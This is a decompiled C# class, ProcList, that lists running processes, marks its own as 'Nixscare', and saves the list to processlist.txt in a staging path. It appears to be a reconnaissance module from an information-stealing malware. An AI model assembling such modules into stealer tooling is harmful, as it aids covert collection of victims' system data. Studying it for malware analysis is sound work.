using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

// Token: 0x02000011 RID: 17
internal class ProcList
{
	// Token: 0x06000029 RID: 41 RVA: 0x00004364 File Offset: 0x00002564
	public static void Parse()
	{
		try
		{
			List<string> list = new List<string>();
			int id = Process.GetCurrentProcess().Id;
			foreach (Process process in Process.GetProcesses())
			{
				list.Add(process.ProcessName + ((process.Id == id) ? " (Nixscare)" : ""));
			}
			list.Sort();
			File.WriteAllText(string.Format("{0}processlist.txt", global::Buffer.path_l), string.Join(Environment.NewLine, list.ToArray()));
		}
		catch
		{
			File.WriteAllText(string.Format("{0}processlist.txt", global::Buffer.path_l), "Proccess list:" + Environment.NewLine + Environment.NewLine + "Error, bad privileges. :(");
		}
	}
}
